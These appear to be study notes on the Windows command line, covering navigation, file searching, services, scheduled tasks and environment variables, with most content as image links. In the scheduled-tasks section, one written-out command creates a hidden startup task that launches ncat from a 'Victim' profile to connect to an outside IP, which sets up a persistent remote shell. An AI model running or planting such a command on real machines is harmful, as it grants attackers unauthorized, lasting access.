   

Introduction to Windows Command Line

Admin Commands  
![b40ece0012dcdbe6e73f12782a000306.png](4a361cf50d8540dda1a288fa9bfb2644%201.png)

---

Terminal Commands (Navigating within a cmd shell)  
![3bec8a19a36b7eb1c96bacb70f92a9cf.png](845af6e37be64631b0b2641c19f137a9.png)

---

Input/Output Operators (Parameters to utilize)  
![111ca71eb5b7a97807b588e7beea3ea2.png](c06ed640e14c4c148926f3b7601175f1.png)

General Commands for both CMD/PS  
![b315aa8d45ce5cbec4276be6fb270dee.png](bd01aa9ec52e425886f0f9235512ebdc%201.png)

File & Directory Commands (CMD)  
![3cab7ac3abfdd263d45718de87f2e780.png](4fc06b0783b1421cb40d81681d1d7df3.png)

![21117d453d0a09c596c287413f30a934.png](f8a479b168834266a7f854ad1c18cfae.png)

![c31475a8ac860d6ea6dd8f264a85277b.png](601fe82e47dc417996f8f5b22b247a6e.png)

![c76a53fd102c53ee05b18b1697f1cebf.png](5bd86bb5f73243ecb1b126be4594d73b.png)

Find & Filter Content (CMD)  
![29fd1831e30f70fc9013a92f9df9b5a6.png](e11ec15ff3cf4ecdbfb7e0ed272565ac.png)

- Recursive Where syntax  
    ![c624dfcc9f92958cd6f51d7178ebe478.png](fd7acd83c9bd4c9b948afa0c5bb845a2.png)
- Wildcard  
    ![c4cc8c098a245c444efb60e001cfa750.png](bb3b9857642d485aa714aa81f6fdca7c.png)
- Basic Find  
    ![22e7fb817351660866f3fc804dcacd1c.png](fb7317f860bc4afeb6fccbe5269a673d.png)
- Find Modifiers  
    ![df4e9849181680c5236b81c9d23328c6.png](61802c6c2dd640fc82616edd7890d14d.png)

![a16b122ca80d65e6a08cc47f3c6dcd5c.png](e909ab99bf29405e8d6ac95882b47290.png)

Evalutating & Sorting Files

- Comp command  
    ![6a00bd1b631c847c9b336455c17b9f1c.png](257e369c49714bcaa32a66a30acefc7e.png)
    
- fc command  
    ![7ebdd2bf667865866e093fa99f2f7423.png](5f24a4b44cec40a6a42f30827068a850.png)
    
- Sort command  
    ![708161ca5c16b4ad6273798ff1878b6d.png](8451acc7839a4c7f9f7c48d99082251b.png)
    
- unique command  
    ![cf575710d4b46a82476f157bd7887ef8.png](ed0d077915b041c287bdbe0a38670b0d.png)
    
- What types of information can we gather once in the system?
    

Breakdown of the information gathered  
![d959782fe0f4ab05fdfab70bc7e42c92.png](c90e3581441d4978b2889322ca3443ae%201.png)

Example of a task  
![6f6fef7c885a4a5f712b29d54c858a31.png](ba87b0ed483d4df980fdf925e5b7a0ea%201.png)

![a90f844de1d12a2b7e0f610dc38c4627.png](f3e7c67024664f1d83a8766af09baa27%201.png)

How Do We get this information?

User Commands (CMD)  
![f319885a657f565bd5358f876ac9ffdd.png](71081cd4de3f475bad75841c3b69be01.png)

Network commands (CMD)  
![d1805e69b95f52b8e216aac67ea63065.png](2a9c422eb9304354aba03563b71cd6cd.png)

NOTE:  
![5273928ed662c584ddf18dbfbaf7547e.png](c3eec2015bb84c40a3f069d8acf2727e.png)

Service Commands (CMD)  
![1409db73761a5330ef83c287937f1c6a.png](fa86ab21370d49febaf28386a2526f1c.png)  
![59ba02fe6942e7973f1f1811be71edab.png](a6f88416d619492da77d707b9210dcae.png)

Querying for Active Services  
![b878f86b1a345e0ef79e329d4192a1ef.png](cc830ff3323444e4b9897f2b93651cd0.png)

NOTICE  
![797e09e081381a03ce8acdaae23062c7.png](7ebe586b070543dc8aa45e53a03a2b76.png)

Window 10 and above  
![6c8a6ae48554d5694a9582f4c84b5f80.png](987252ace5764dff91922961da1ae28e.png)

Scheduled Tasking  
![718f49cf6cfe61d75d2150ca78eee978.png](324151138adb4abca2b8f1684838e7f4.png)

Scheduled Task Commands  
![44e1163dbf9f3f0ab73bc43115ba9f0b.png](d54c8b8ccb954cccb84ca733812a32dd.png)

Query Syntax  
![e225d3ec3edc64b25169125deaa34a7d.png](29c5353efd6b4c4a9ca2b6f90e7b5f9a.png)

Create Syntax  
![05d08f2b6a95e2a1a07155284d17a77b.png](07583b525a504eedb8c9d57f75280881.png)

- Creating a New Task requires the following at minimum:
    - /create : to tell it what we are doing
    - /sc : we must set a schedule
    - /tn : we must set the name
    - /tr : We must give it an action to take

New Task Creation for a shell

`schtasks /create /sc ONSTART /tn "My Secret Task" /tr "C:\Users\Victim\Appdata\Local\ncat.exe 172.16.1.100 8100"`

Change Syntax  
![c9e38c943c215972f8d355311039621f.png](e3fab631eeb947fbac36ba350d286702.png)

Change Syntax to add Admin and pw  
![d95cb381dcc506a9230182efe56fe702.png](7f1d38ac3e1e4ab482bbd743bca54b00.png)

Delete Syntax  
![460f263b3153fefe11d8b2d12775b4d3.png](7d81cd1e48a84b71b747148d8bd4dd5f.png)

Environmental Variables  
![7766b61856bd6f27cccc17596fb8de88.png](46a02bd774f1492e82033a4c36e08c1b.png)

- On Windows host, env. variables are not case sensitive
- No name that start w/ a # or includes an equal sign  
    ![f0f0f9ea034c6f2965741453c286f975.png](e77204e4a6ff4bbe8a7570352d9e5086.png)
- Create a variable  
    ![a699eac65d7430bdcd3b4a760aea0a11.png](9eed208c17ef4bd082ce14ef3c5fe283.png)
    - set only affects the current session
    - setx can make permenant changes  
        ![379efd746c2b71726c46ea0df15ab85b.png](a305c0e132724a35ac6cdce9f4e74601.png)
    - This change will be validated only after open another cmd session
- Editing Variables  
    ![5849a283f27e7bf749051fdfd0bddd71.png](2393aae6cdb5464fb5d922f8db38ba04.png)
- Removing Variables  
    ![52746cba9b644c9f20d5b30dbb021c82.png](2fa4b32adc32480092310af81d62802c.png)

---

Scopes  
![ef5388a603484062b930a6a472af6013.png](26656939619b4620a8d35fb7db24749c.png)

![3faf1585d0e1dd39a8be8576fa8629cf.png](0cd4bb81b1344cdd8bbae94475871161.png)  
![2c50f27a9d6b893b586b25fa0ecfb12d.png](0e02d1b366a948eb92da8a3c68eb6a52.png)  
![f9555bbe00d61c06736562196f2ba30b.png](d4fa9e704e4c4c34a59f628dbe35ecb8.png)

Interesting Directories  
![d52e6da646e3fb4137dce932f037bcd3.png](34df72456e7b49619a616dc0d8dd6e28.png)

![480e2f90f1d3493df50d764d48528184.png](0d86f595d8044e35a184e7f57f1b31e5.png)